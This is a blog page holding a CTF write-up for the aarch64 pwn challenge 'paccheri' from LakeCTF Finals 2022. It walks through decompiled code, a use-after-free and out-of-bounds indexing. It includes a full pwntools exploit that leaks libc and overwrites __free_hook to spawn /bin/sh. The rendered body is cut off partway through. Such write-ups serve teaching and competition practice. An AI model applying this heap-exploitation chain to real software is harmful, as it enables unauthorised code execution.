<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[LakeCTF Finals 2022] paccheri | NUS Greyhats</title>
<meta name=keywords content="writeups,ctf,pwn"><meta name=description content="LakeCTF Finals 2022: paccheri (pwn) writeup."><meta name=author content="Enigmatrix"><link rel=canonical href=https://nusgreyhats.org/posts/writeups/lakectf-finals-2022-paccheri/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel=stylesheet><link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel=stylesheet><link crossorigin=anonymous href=/assets/css/stylesheet.min.b268fb3bd1950526ba32df2898e8dfc3171f0fecdf09cd6945557b277f0eecf8.css integrity="sha256-smj7O9GVBSa6Mt8omOjfwxcfD+zfCc1pRVV7J38O7Pg=" rel="preload stylesheet" as=style><link rel=preload href=/greyhats-dark.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.5b9ae0304f93db6cc493f51846f012428af399c614b4f2fbdb7fa59dd4d5ef5b.js integrity="sha256-W5rgME+T22zEk/UYRvASQorzmcYUtPL723+lndTV71s=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://nusgreyhats.org/greyhats.png><link rel=icon type=image/png sizes=16x16 href=https://nusgreyhats.org/greyhats.png><link rel=icon type=image/png sizes=32x32 href=https://nusgreyhats.org/greyhats.png><link rel=apple-touch-icon href=https://nusgreyhats.org/greyhats.png><link rel=mask-icon href=https://nusgreyhats.org/greyhats.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.120.4"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="[LakeCTF Finals 2022] paccheri"><meta property="og:description" content="LakeCTF Finals 2022: paccheri (pwn) writeup."><meta property="og:type" content="article"><meta property="og:url" content="https://nusgreyhats.org/posts/writeups/lakectf-finals-2022-paccheri/"><meta property="og:image" content="https://nusgreyhats.org/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-11-07T00:17:30+08:00"><meta property="article:modified_time" content="2022-11-07T00:17:30+08:00"><meta property="og:site_name" content="NUS Greyhats"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nusgreyhats.org/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="[LakeCTF Finals 2022] paccheri"><meta name=twitter:description content="LakeCTF Finals 2022: paccheri (pwn) writeup."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://nusgreyhats.org/posts/"},{"@type":"ListItem","position":2,"name":"[LakeCTF Finals 2022] paccheri","item":"https://nusgreyhats.org/posts/writeups/lakectf-finals-2022-paccheri/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[LakeCTF Finals 2022] paccheri","name":"[LakeCTF Finals 2022] paccheri","description":"LakeCTF Finals 2022: paccheri (pwn) writeup.","keywords":["writeups","ctf","pwn"],"articleBody":"paccheri I played LakeCTF Finals 2022 with my team NUS Greyhats (in Switzerland!). We managed to get first blood on both pwn challenges (i hate french and paccheri). This writeup will be for paccheri since i hate french was solved by 9 out of 10 teams.\nThis challenge was solved the unintended way, which is becoming a usual situation for me.\nRunning checksec, we get:\n[*] '~/ctfs/lakefinals22/paccheri/paccheri' Arch: aarch64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Hmm, interesting to see that we have a aarch64 challenge. Is this is MacOS / IoT / ARM challenge? Emulating this was going to be painful, but luckily the organizers had already thought of this.\nThere are a few files attached to the challenge, other than the usualy binary + libc. There is the Dockerfile \u0026 compose.yml which are usually meant to describe the service configuration. Also a README.md:\n# How to not turn crazy (QEMU PTSD anyone?) 1. `docker compose build` 2. `docker compose up` 3. Connect to the challenge with `nc localhost 3700`, ssh into the arm64 VM with `ssh root@localhost -p 30022` Note: The challenge is located in `/app` in the VM. The VM contains exactly the `paccheri` and `libc.so.6` you're provided with. The only difference is that in the VM, `/proc/self/maps` is symlinked to `/app/postal_codes` -- we unfortunately cannot ship symlinks ;) Very cool, they already have a setup to emulate aarch64 and even managed to give us a ssh shell.\nAnalysis undefined8 main(void) { char *found; size_t section_start; ulong section_end; char section_name [20000]; long local_8 = __stack_chk_guard; setvbuf(stdin,NULL,2,0); setvbuf(stdout,NULL,2,0); setvbuf(stderr,NULL,2,0); urandom_fd = fopen(\"/dev/urandom\",\"r\"); heap_addr_ref = (ulong *)mmap(NULL,0x1000,3,0x22,0,0); mem_p_1 = heap_addr_ref + 1; ulong* local_4e38 = heap_addr_ref; FILE* postal_codes_fd = fopen(\"postal_codes\",\"r\"); do { __isoc99_fscanf(postal_codes_fd,\"%p-%p %2000[^\\n]\",\u0026section_start,\u0026section_end,section_name); if (*heap_addr_ref \u003c section_end) { *heap_addr_ref = section_end; } found = strstr(section_name,\"[heap]\"); } while (found == NULL); puts(\"Welcome to the Swiss post office\"); puts(\"Our famous privacy policies encrypt (and sign!) the destination of every packet\"); puts(\"How can we help you?\"); main2(); if (local_8 - __stack_chk_guard == 0) { return 0; } // WARNING: Subroutine does not return __stack_chk_fail(\u0026__stack_chk_guard,0,local_8 - __stack_chk_guard,0); } From README.md, there is a symlink between /proc/self/maps and /app/postal_codes. Thus, the above code seems to be reading the memory map entries of the currently running process (given in /proc/self/maps) to parse the max address of the heap section.\nThen main2 is called:\nvoid main2(void) { while (true) { puts(\"1. Send a package\"); puts(\"2. Report a lost package\"); puts(\"3. List outgoing packages\"); puts(\"4. Set address of outgoing package\"); puts(\"5. Check if a package is arrived\"); puts(\"6. Exit\"); puts(\"7. Get angry because you don\\'t have an aarch64 machine available\"); puts(\"8. Complain because this menu is too long\"); putchar(10); int opt = read_int(opt); switch(opt) { case 1: send_package(); break; case 2: report_lost_package(); break; case 3: list_packages(); break; case 4: set_address_package(); break; case 5: check_package_arrival(); break; case 6: exit(0); break; case 7: useless(); break; case 8: useless2(); break; default: puts(\"Vouz parlez franchoise?\"); } } } useless and useless2 print some text and call exit(0), so I’m leaving this part out. We have 5 legitimate options excluding exit.\nsend_package void send_package(void) { if (packages_len \u003c 0x14) { package* pkg = (package *)malloc(0x18); long idx = (long)packages_len; packages_len = packages_len + 1; packages[idx] = pkg; char* address = (char *)malloc(0x18); puts(\"Please enter your destination address:\"); fgets(address,0x18,stdin); pkg-\u003eaddress = address; fread(\u0026pkg-\u003eurandom_num,1,4,urandom_fd); address = (char *)pointer_auth_tech(print_pkg_arrival,pkg-\u003eurandom_num); pkg-\u003epointer_auth = address; pkg-\u003eidx = packages_len + -1; } else puts(\"Sorry, we are swiss but we can\\'t handle so many packages\"); } We can allocate upto 0x14 = 20 packages. I have defined each package as below:\nstruct package { // pointer to 0x18-long malloc'ed char array char[0x18]* address; // 0x00 int idx; // 0x08 int urandom_num // 0x0C void* pointer_auth // 0x10 } // 0x18 bytes long The only input is the 0x18-bytes long package address. There is a very weird calculation in pointer_auth_tech:\nulong pointer_auth_tech(void* fnaddr, int num) { ulong uVar1 = pacga(fnaddr, num); return fnaddr ^ uVar1 \u0026 const_FFFF000000000000; } where pacga is a ARM64 instruction related to Pointer Authentication Code. Seems like a function pointer is ‘protected’ by pointer authentication using a random seed from /dev/urandom.\nThe function pointer is initially set to print_pkg_arrival:\nint print_pkg_arrival(char* arg) { return printf(\"The package has arrived to: %s!\\n\",arg); } report_lost_package void report_lost_package(void) { puts(\"Which package did you lose?\"); int idx = read_int(idx); // BUG: UaF, also no bounds check free(packages[idx]-\u003eaddress); if ((idx \u003c 0x12) \u0026\u0026 (-1 \u003c idx)) { free(packages[idx]); packages[idx] = NULL; } else puts(\"You definitely did not.\"); } We have a Use-After-Free when we provide an index not lesser than 0x12, which frees the package address at that index but does not remove the package from the packages array. This leaves us with a package with dangling reference to freed memory, which we can use (Use-After-Free).\nFurthermore, the index can be negative. So we can free the address of a supposed package that is before the packages array.\nlist_packages void list_packages(void) { puts(\"---\"); uint state = 0; for (int i = 0; i \u003c packages_len; i = i + 1) { printf(\"Address: %s\",packages[i]-\u003eaddress); printf(\"id: %d\\n\",(ulong)(uint)packages[i]-\u003eidx); void* cb = undo_pacga(packages[i]-\u003epointer_auth, packages[i]-\u003eurandom_num); printf(\"callback: %p\\n\", cb); void* pointer = packages[i]-\u003epointer_auth; void* pac = pointer_auth_tech( (ulong)packages[i]-\u003epointer_auth \u0026 ~const_FFFF000000000000, packages[i]-\u003eurandom_num); state = some_crc32_thing(state, pointer ^ pac); puts(\"---\"); } printf(\"Error state: %x\\n\", state); } Here we can see that we have an base address leak since the address of the callback is printed out, which is initially set the print_pkg_arrival. There also seems to be some calculation involving the pointer authentication that I thought involved CRC32 calculations due to the use of 0xedb88320.\nuint some_crc32_thing(uint prev_state, ulong arg) { uint n = ~prev_state; for (uint i = 0; (int)i \u003c 8; i = i + 1) { n = n ^ (uint)((long)((long)(0xff \u003c\u003c (ulong)((i \u0026 3) \u003c\u003c 3)) \u0026 arg) \u003e\u003e ((ulong)(i \u003c\u003c 3) \u0026 0x3f)); for (uint b = 7; -1 \u003c b; b = b + -1) { n = n \u003e\u003e 1 ^ -(n \u0026 1) \u0026 0xedb88320; } } return ~n; } set_address_package void set_address_package(void) { puts(\"Which package do you want to edit?\"); // BUG: no bounds check int idx = read_int(idx); puts(\"Please enter the new address:\"); if (*heap_addr_ref \u003c packages[idx]-\u003eaddress) { puts(\"This address is not in Switzerland!\"); exit(0); } int read = fread(packages[idx]-\u003eaddress,1,0x18,stdin); printf(\"read %d bytes\\n\", read); printf(\"New address: %s\\n\",packages[idx]-\u003eaddress); void* cb = undo_pacga(packages[idx]-\u003epointer_auth, packages[idx]-\u003eurandom_num); printf(\"New callback: %p\\n\", cb); } This function from the lack of bounds check as well. Interestingly enough, it prints the callback even though it was never changed (this is for the intended solution).\ncheck_package_arrival void check_package_arrival(void) { puts(\"Which package do you want to check?\"); int idx = read_int(); void* cb = undo_pacga(packages[idx]-\u003epointer_auth, packages[idx]-\u003eurandom_num); (cb)(packages[idx]-\u003eaddress); } This method calls the callback that was set with the address of the package as the argument. Again, same lack of bounds check applies here. Sadly, undo_pacga returns a address only if it was protected by pointer authentication, or it returns 0 (which causes segfault when executed).\nulong undo_pacga(void* pointer, ulong urandom_num) { ulong ret = pointer ^ pointer \u0026 const_FFFF000000000000; ulong check = pacga(ret, urandom_num); if ((check \u0026 const_FFFF000000000000) != (pointer \u0026 const_FFFF000000000000)) { ret = 0; } return ret; } Exploitation We have 3 out-of-bounds vuln which treat parts of the .data as a package*, and one UaF.\nInitially, I was trying to use the UaF to corrupt a package and write my own function pointer there to get it executed (after bypassing PAC). I believe this to be the intended solution by the author.\nHowever, while trying to do this, I realized that there was a easier way to approach the problem.\nArbitrary Write In every binary compiled by GCC, there exists an address in the .data section that points to itself. That is, the value at the address is the address itself.\nThis also happens to be before the packages array:\nIf we provide (0x113008-0x113040) / sizeof(package*) as the index to set_address_package, it will treat this self-loop address as a package*. It will get the address pointer, which is at package-\u003eaddress = package[0] as the address is the first element of package. This, of course, is the self-loop address again. Then, we can write 0x18 bytes to this address. Note that there is a *heap_addr_ref \u003c package[i]-\u003eaddress check, which does not get triggered since the heap is after the base of the program.\nThis allows us to gain control over some memory in the .data section. However, just this is enough to get an arbitrary write primitive! We can setup our write to do the following (right side is the ’effect’):\nNow if we treat (0x113010-0x113040) / sizeof(package*) (the pointer after the self-loop) as a package*, it’s set up as below:\nSince we are writing to address, we now have arbitrary write using set_address_package when targetting this index. Furthermore, since the self-loop still points to itself afterwards, we can use this arbwrite as many times as we want.\nLibc Leak There is no fancy win function in the binary itself, so we must leak a libc address to get us going.\nSince we have arbitrary write and know the base address, we can overwrite packages[0..3] to a forged package, whose address is pointing to an address we want to leak e.g. printf.got. Running list_packages will then leak out the bytes we want.\nGetting command execution With a libc address and base address known, one would normally overwrite the GOT section to gain command execution, but here it’s protected by full RELRO and is not writable.\nWe can try to overwrite __free_hook instead but we are blocked by the *heap_addr_ref check. But of course, since we have arb write, we can just overwrite this as well. Our aim will be to get free called in report_lost, and we provide the index of a package with address set to /bin/sh to get system(\"/bin/sh\") executed.\nFinal Script The overwriting of heap_addr_ref is combined with creation of a forged package, but the rest are as above.\nfrom pwn import * #p = remote(\"localhost\", \"3700\") p = remote(\"chall.polygl0ts.ch\", 3700) def send_package(address): p.sendlineafter(\"menu is too long\", \"1\") p.sendlineafter(\"address:\", address) def report_lost(idx): p.sendlineafter(\"menu is too long\", \"2\") p.sendlineafter(\"lose?\", str(idx)) def list_packages(): p.sendlineafter(\"menu is too long\", \"3\") pkgs = [] while True: if b\"Error\" in p.recvuntil((\"Error\", \"Address\")): p.recvuntil(\": \") error_state = int(p.recvline()[:-1], 16) break p.recvuntil(\": \") address = p.recvuntil(\"id: \", drop=True) id = p.recvline()[:-1] p.recvuntil(\"callback: \") cb = p.recvline()[:-1] if cb == b'(nil)': cb = 0 else: cb = int(cb, 16) p.recvuntil(\"---\") pkgs.append((address, id, cb)) return pkgs, error_state def set_address(idx, address): p.sendlineafter(\"menu is too long\", \"4\") p.sendlineafter(\"edit?\", str(idx)) p.sendafter(\"address:\", address) send_package(str(0)) pkgs, _ = list_packages() base = pkgs[0][2] - 0xedc info(f\"{ hex(base) = }\") # just create some packages for i in range(1, 7): send_package(b\"/bin/sh\\x00\") def arbwrite(where, what): set_address(-(0x113048 - 0x113008)//8, p64(base + 0x13008) + p64(base + 0x13018) + p64(where)) set_address(-(0x113048 - 0x113010)//8, what) libc = ELF(\"./libc.so.6\") # Overwrite heap_addr_ref to point to base+0x13030, which contains 0xfffff.... # Also put the address of printf.got here so that we can use it as a forged package. arbwrite(base + 0x13028, p64(base + 0x13030) + p64(0xffffffffffffffff) + p64(base + 0x12f78)) # printf.got @ +0x13038 # Write the address of the forged package as the packages of the first 3 elements in the packages array arbwrite(base + 0x13048, p64(base + 0x13038) * 3) # Leak out libc pkgs, _ = list_packages() leak = u64(pkgs[0][0].ljust(8, b'\\0')) info(f\"{ hex(leak) = }\") libc.address = leak - libc.symbols.printf success(f\"{hex(libc.address) = }\") arbwrite(libc.symbols.__free_hook, p64(libc.symbols.system)*3) report_lost(4) # calls free(package[4]-\u003eaddress), so system(\"/bin/sh\") after the __free_hook overwrite p.interactive() ","wordCount":"1914","inLanguage":"en","datePublished":"2022-11-07T00:17:30+08:00","dateModified":"2022-11-07T00:17:30+08:00","author":{"@type":"Person","name":"Enigmatrix"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://nusgreyhats.org/posts/writeups/lakectf-finals-2022-paccheri/"},"publisher":{"@type":"Organization","name":"NUS Greyhats","logo":{"@type":"ImageObject","url":"https://nusgreyhats.org/greyhats.png"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://nusgreyhats.org/ accesskey=h title="NUS Greyhats (Alt + H)"><img src=/greyhats-dark.png alt=logo aria-label=logo id=logo height=35>
<script>localStorage.getItem("pref-theme")==="light"?document.getElementById("logo").src="/greyhats.png":document.getElementById("logo").src="/greyhats-dark.png"</script>NUS Greyhats</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://nusgreyhats.org/team title="the team"><span>the team</span></a></li><li><a href=https://nusgreyhats.org/secweds title=secweds><span>secweds</span></a></li><li><a href=https://nusgreyhats.org/resources/ title=resources><span>resources</span></a></li><li><a href=https://nusgreyhats.org/tags/ title=tags><span>tags</span></a></li><li><a href=https://nusgreyhats.org/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>[LakeCTF Finals 2022] paccheri</h1><div class=post-description>LakeCTF Finals 2022: paccheri (pwn) writeup.</div><div class=post-meta><span title='2022-11-07 00:17:30 +0800 +0800'>November 7, 2022</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;Enigmatrix&nbsp;|&nbsp;<a href=https://github.com/NUSGreyhats/NUSGreyhats.github.io/tree/master/content/posts/writeups/[LakeCTF%20Finals%202022]%20paccheri.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><h1 id=paccheri>paccheri<a hidden class=anchor aria-hidden=true href=#paccheri>#</a></h1><p>I played LakeCTF Finals 2022 with my team NUS Greyhats (in Switzerland!). We managed to get first blood on both pwn challenges (<code>i hate french</code> and <code>paccheri</code>).
This writeup will be for <code>paccheri</code> since <code>i hate french</code> was solved by 9 out of 10 teams.</p><p>This challenge was solved the unintended way, which is becoming a usual situation for me.</p><p><img loading=lazy src=https://i.imgur.com/4zpwYvM.png alt></p><p>Running <code>checksec</code>, we get:</p><pre tabindex=0><code>[*] &#39;~/ctfs/lakefinals22/paccheri/paccheri&#39;
    Arch:     aarch64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre><p>Hmm, interesting to see that we have a <code>aarch64</code> challenge. Is this is MacOS / IoT / ARM challenge? Emulating this was going to be painful, but luckily the organizers had already thought of this.</p><p>There are a few files attached to the challenge, other than the usualy binary + libc. There is the <code>Dockerfile</code> & <code>compose.yml</code> which are usually meant to describe the service configuration. Also a <code>README.md</code>:</p><pre tabindex=0><code># How to not turn crazy (QEMU PTSD anyone?)

1. `docker compose build`
2. `docker compose up`
3. Connect to the challenge with `nc localhost 3700`, ssh into the arm64 VM
   with `ssh root@localhost -p 30022`

Note: The challenge is located in `/app` in the VM. The VM contains exactly the
`paccheri` and `libc.so.6` you&#39;re provided with. The only difference is that in
the VM, `/proc/self/maps` is symlinked to `/app/postal_codes` -- we unfortunately
cannot ship symlinks ;)
</code></pre><p>Very cool, they already have a setup to emulate <code>aarch64</code> and even managed to give us a <code>ssh</code> shell.</p><h2 id=analysis>Analysis<a hidden class=anchor aria-hidden=true href=#analysis>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>undefined8 <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>found;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> section_start;
</span></span><span style=display:flex><span>  ulong section_end;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> section_name [<span style=color:#ae81ff>20000</span>];
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> local_8 <span style=color:#f92672>=</span> __stack_chk_guard;
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setvbuf</span>(stdin,NULL,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setvbuf</span>(stdout,NULL,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setvbuf</span>(stderr,NULL,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  urandom_fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;/dev/urandom&#34;</span>,<span style=color:#e6db74>&#34;r&#34;</span>);
</span></span><span style=display:flex><span>  heap_addr_ref <span style=color:#f92672>=</span> (ulong <span style=color:#f92672>*</span>)<span style=color:#a6e22e>mmap</span>(NULL,<span style=color:#ae81ff>0x1000</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>0x22</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>  mem_p_1 <span style=color:#f92672>=</span> heap_addr_ref <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  ulong<span style=color:#f92672>*</span> local_4e38 <span style=color:#f92672>=</span> heap_addr_ref;
</span></span><span style=display:flex><span>  FILE<span style=color:#f92672>*</span> postal_codes_fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>fopen</span>(<span style=color:#e6db74>&#34;postal_codes&#34;</span>,<span style=color:#e6db74>&#34;r&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>do</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>__isoc99_fscanf</span>(postal_codes_fd,<span style=color:#e6db74>&#34;%p-%p %2000[^</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>]&#34;</span>,<span style=color:#f92672>&amp;</span>section_start,<span style=color:#f92672>&amp;</span>section_end,section_name);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>*</span>heap_addr_ref <span style=color:#f92672>&lt;</span> section_end) {
</span></span><span style=display:flex><span>      <span style=color:#f92672>*</span>heap_addr_ref <span style=color:#f92672>=</span> section_end;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    found <span style=color:#f92672>=</span> <span style=color:#a6e22e>strstr</span>(section_name,<span style=color:#e6db74>&#34;[heap]&#34;</span>);
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>while</span> (found <span style=color:#f92672>==</span> NULL);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Welcome to the Swiss post office&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Our famous privacy policies encrypt (and sign!) the destination of every packet&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;How can we help you?&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>main2</span>();
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (local_8 <span style=color:#f92672>-</span> __stack_chk_guard <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// WARNING: Subroutine does not return
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#a6e22e>__stack_chk_fail</span>(<span style=color:#f92672>&amp;</span>__stack_chk_guard,<span style=color:#ae81ff>0</span>,local_8 <span style=color:#f92672>-</span> __stack_chk_guard,<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>From <code>README.md</code>, there is a symlink between <code>/proc/self/maps</code> and <code>/app/postal_codes</code>. Thus, the above code seems to be reading the memory map entries of the currently running process (given in <code>/proc/self/maps</code>) to parse the max address of the heap section.</p><p><img loading=lazy src=https://i.imgur.com/l2EMrR3.png alt></p><p>Then <code>main2</code> is called:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main2</span>(<span style=color:#66d9ef>void</span>) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> (true) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;1. Send a package&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;2. Report a lost package&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;3. List outgoing packages&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;4. Set address of outgoing package&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;5. Check if a package is arrived&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;6. Exit&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;7. Get angry because you don</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>t have an aarch64 machine available&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;8. Complain because this menu is too long&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>putchar</span>(<span style=color:#ae81ff>10</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> opt <span style=color:#f92672>=</span> <span style=color:#a6e22e>read_int</span>(opt);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>switch</span>(opt) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>send_package</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>report_lost_package</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>3</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>list_packages</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>4</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>set_address_package</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>5</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>check_package_arrival</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>6</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>7</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>useless</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>case</span> <span style=color:#ae81ff>8</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>useless2</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Vouz parlez franchoise?&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
